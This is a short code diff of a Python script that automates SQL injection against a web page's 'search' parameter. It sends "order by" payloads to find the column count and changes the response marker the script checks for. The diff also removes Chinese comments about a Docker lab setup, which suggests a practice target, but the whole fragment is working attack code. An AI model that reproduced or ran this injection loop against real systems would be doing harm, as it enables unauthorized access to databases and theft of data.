@@ -11,11 +11,8 @@ while True:
     dbNameLen_url = url + "?search=1' and 1=1 order by "+str(dbLen)+"--+"
     print(dbNameLen_url)
 
-    if "1' and 1=1 order" in requests.get(dbNameLen_url).text:
+    if "td" in requests.get(dbNameLen_url).text:
         if dbLen == 10:
-            # docker镜像后，没有执行语句显示空白页面的场景
-            # 根据第二步回显点也可判断字段数
-            # 为与原破解过程保持一致，此处直接赋值
             dbLen = 4
             print("- - - - - - - - - - - - - - - - - - - - - - - - - - ")
             print("The len of dbName:"+str(dbLen))
